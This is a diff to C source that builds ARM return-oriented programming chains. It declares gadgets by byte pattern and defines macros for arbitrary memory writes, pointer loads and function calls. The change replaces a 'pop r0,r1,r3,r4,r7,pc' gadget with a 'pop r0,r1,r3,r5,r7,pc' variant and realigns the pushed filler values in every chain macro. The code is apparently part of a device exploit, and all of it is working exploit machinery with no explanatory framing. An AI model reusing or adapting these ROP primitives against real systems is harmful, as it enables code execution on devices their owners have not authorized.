@@ -542,7 +542,7 @@ int main(int argc, const char * argv[]) {
     DeclGadget(str_r0_r4_8_pop_r4r7pc, (&(char[]){0xa0,0x60,0x90,0xbd}), 4);
     DeclGadget(bx_r2_pop_r4r5r7pc, (&(char[]){0x10,0x47,0xb0,0xbd}), 4);
     DeclGadget(bx_r2_add_sp_40_pop_r8r10r11r4r5r6r7pc, (&(char[]){0x10,0x47,0x10,0xB0,0xBD,0xE8,0x00,0x0D,0xF0,0xBD}), 10);
-    DeclGadget(pop_r0r1r3r4r7pc, (&(char[]){0xab,0xbd}), 2);
+    DeclGadget(pop_r0r1r3r5r7pc, (&(char[]){0xab,0xbd}), 2);
     
     //  DeclGadget(pop_r0r1r2r4r5pc, (&(char[]){0x37,0xbd}), 2);
     
@@ -598,11 +598,11 @@ push = (uint32_t)0x45454545;\
 push = (uint32_t)m_m_scratch
     
 #define WriteWhatWhere(push,what, where)\
-push = (uint32_t)pop_r0r1r3r4r7pc;\
+push = (uint32_t)pop_r0r1r3r5r7pc;\
 push = (uint32_t)what;\
 push = (uint32_t)0x11111111;\
 push = (uint32_t)0x22222222;\
-push = ((uint32_t)where) - 8;\
+push = (uint32_t)0x45454545;\
 push = (uint32_t)m_m_scratch;\
 push = (uint32_t)pop_r4r7pc;\
 push = ((uint32_t)where) - 8;\
@@ -612,12 +612,12 @@ push = (uint32_t)0x44444444;\
 push = (uint32_t)m_m_scratch
     
 #define LoadIntoR0(push, where)\
-push = (uint32_t)pop_r0r1r3r4r7pc;\
+push = (uint32_t)pop_r0r1r3r5r7pc;\
 push = (uint32_t)where - 8;\
 push = (uint32_t)0x11111111;\
-push = (uint32_t)0x22222222;\
-push = (uint32_t)0x44444444; \
-push = (uint32_t)0x55555555; \
+push = (uint32_t)0x33333333;\
+push = (uint32_t)0x45454545; \
+push = (uint32_t)m_m_scratch; \
 push = (uint32_t)ldr_r0_r0_8_pop_r7pc;\
 push = (uint32_t)m_m_scratch
     
@@ -681,11 +681,11 @@ RopNopSlide(push)
 #define RopCallFunction10Deref1(push, name, repl_arg_0, read_ptr_0, a, b, c, d, e, f, g, h, i, l) RopCallFunctionPointer9Deref1(push,[dy solveSymbol:name], repl_arg_0,read_ptr_0,a,b,c,d,e,f,g,h,i,l)
 #define RopCallFunctionPointer10Deref1(push, ptr, repl_arg_0, read_ptr_0, a, b, c, d, e, f, g, h, i, l) \
 RopFixupLR(push);\
-push = (uint32_t)pop_r0r1r3r4r7pc;\
+push = (uint32_t)pop_r0r1r3r5r7pc;\
 push = (uint32_t)read_ptr_0 - 8;\
 push = (uint32_t)0x11111111;\
 push = (uint32_t)0x33333333;\
-push = (uint32_t)0x44444444;\
+push = (uint32_t)0x45454545;\
 push = (uint32_t)m_m_scratch; \
 push = (uint32_t)ldr_r0_r0_8_pop_r7pc;\
 push = (uint32_t)m_m_scratch;\
@@ -721,11 +721,11 @@ RopNopSlide(push)
     
 #define RopCallFunctionPointer9Deref2(push, ptr, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, a, b, c, d, e, f, g, h, i) \
 RopFixupLR(push);\
-push = (uint32_t)pop_r0r1r3r4r7pc;\
+push = (uint32_t)pop_r0r1r3r5r7pc;\
 push = (uint32_t)read_ptr_1 - 8;\
 push = (uint32_t)0x11111111;\
 push = (uint32_t)0x33333333;\
-push = (uint32_t)0x44444444;\
+push = (uint32_t)0x45454545;\
 push = (uint32_t)m_m_scratch; \
 push = (uint32_t)ldr_r0_r0_8_pop_r7pc;\
 push = (uint32_t)m_m_scratch;\
@@ -736,11 +736,11 @@ push = (uint32_t)m_m_scratch;\
 push = (uint32_t)str_r0_r4_8_pop_r4r7pc;\
 push = (uint32_t)0x44444444;\
 push = (uint32_t)m_m_scratch;\
-push = (uint32_t)pop_r0r1r3r4r7pc;\
+push = (uint32_t)pop_r0r1r3r5r7pc;\
 push = (uint32_t)read_ptr_0 - 8;\
 push = (uint32_t)0x11111111;\
 push = (uint32_t)0x33333333;\
-push = (uint32_t)0x44444444;\
+push = (uint32_t)0x45454545;\
 push = (uint32_t)m_m_scratch; \
 push = (uint32_t)ldr_r0_r0_8_pop_r7pc;\
 push = (uint32_t)m_m_scratch;\
@@ -771,11 +771,11 @@ RopNopSlide(push)
     
 #define RopCallFunctionPointer9Deref3(push, ptr, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, repl_arg_2, read_ptr_2, a, b, c, d, e, f, g, h, i) \
 RopFixupLR(push);\
-push = (uint32_t)pop_r0r1r3r4r7pc;\
+push = (uint32_t)pop_r0r1r3r5r7pc;\
 push = (uint32_t)read_ptr_2 - 8;\
 push = (uint32_t)0x11111111;\
 push = (uint32_t)0x33333333;\
-push = (uint32_t)0x44444444;\
+push = (uint32_t)0x45454545;\
 push = (uint32_t)m_m_scratch; \
 push = (uint32_t)ldr_r0_r0_8_pop_r7pc;\
 push = (uint32_t)m_m_scratch;\
@@ -786,11 +786,11 @@ push = (uint32_t)m_m_scratch;\
 push = (uint32_t)str_r0_r4_8_pop_r4r7pc;\
 push = (uint32_t)0x44444444;\
 push = (uint32_t)m_m_scratch;\
-push = (uint32_t)pop_r0r1r3r4r7pc;\
+push = (uint32_t)pop_r0r1r3r5r7pc;\
 push = (uint32_t)read_ptr_1 - 8;\
 push = (uint32_t)0x11111111;\
 push = (uint32_t)0x33333333;\
-push = (uint32_t)0x44444444;\
+push = (uint32_t)0x45454545;\
 push = (uint32_t)m_m_scratch; \
 push = (uint32_t)ldr_r0_r0_8_pop_r7pc;\
 push = (uint32_t)m_m_scratch;\
@@ -801,11 +801,11 @@ push = (uint32_t)m_m_scratch;\
 push = (uint32_t)str_r0_r4_8_pop_r4r7pc;\
 push = (uint32_t)0x44444444;\
 push = (uint32_t)m_m_scratch;\
-push = (uint32_t)pop_r0r1r3r4r7pc;\
+push = (uint32_t)pop_r0r1r3r5r7pc;\
 push = (uint32_t)read_ptr_0 - 8;\
 push = (uint32_t)0x11111111;\
 push = (uint32_t)0x33333333;\
-push = (uint32_t)0x44444444;\
+push = (uint32_t)0x45454545;\
 push = (uint32_t)m_m_scratch; \
 push = (uint32_t)ldr_r0_r0_8_pop_r7pc;\
 push = (uint32_t)m_m_scratch;\
@@ -834,11 +834,11 @@ RopNopSlide(push)
     
 #define RopCallDerefFunctionPointer10Deref2(push, fptr_deref, repl_arg_0, read_ptr_0, repl_arg_1, read_ptr_1, a, b, c, d, e, f, g, h, i, l) \
 RopFixupLR(push);\
-push = (uint32_t)pop_r0r1r3r4r7pc;\
+push = (uint32_t)pop_r0r1r3r5r7pc;\
 push = (uint32_t)fptr_deref - 8;\
 push = (uint32_t)0x11111111;\
 push = (uint32_t)0x33333333;\
-push = (uint32_t)0x44444444;\
+push = (uint32_t)0x45454545;\
 push = (uint32_t)m_m_scratch; \
 push = (uint32_t)ldr_r0_r0_8_pop_r7pc;\
 push = (uint32_t)m_m_scratch;\
@@ -849,11 +849,11 @@ push = (uint32_t)m_m_scratch;\
 push = (uint32_t)str_r0_r4_8_pop_r4r7pc;\
 push = (uint32_t)0x44444444;\
 push = (uint32_t)m_m_scratch;\
-push = (uint32_t)pop_r0r1r3r4r7pc;\
+push = (uint32_t)pop_r0r1r3r5r7pc;\
 push = (uint32_t)read_ptr_1 - 8;\
 push = (uint32_t)0x11111111;\
 push = (uint32_t)0x33333333;\
-push = (uint32_t)0x44444444;\
+push = (uint32_t)0x45454545;\
 push = (uint32_t)m_m_scratch; \
 push = (uint32_t)ldr_r0_r0_8_pop_r7pc;\
 push = (uint32_t)m_m_scratch;\
@@ -864,11 +864,11 @@ push = (uint32_t)m_m_scratch;\
 push = (uint32_t)str_r0_r4_8_pop_r4r7pc;\
 push = (uint32_t)0x44444444;\
 push = (uint32_t)m_m_scratch;\
-push = (uint32_t)pop_r0r1r3r4r7pc;\
+push = (uint32_t)pop_r0r1r3r5r7pc;\
 push = (uint32_t)read_ptr_0 - 8;\
 push = (uint32_t)0x11111111;\
 push = (uint32_t)0x33333333;\
-push = (uint32_t)0x44444444;\
+push = (uint32_t)0x45454545;\
 push = (uint32_t)m_m_scratch; \
 push = (uint32_t)ldr_r0_r0_8_pop_r7pc;\
 push = (uint32_t)m_m_scratch;\
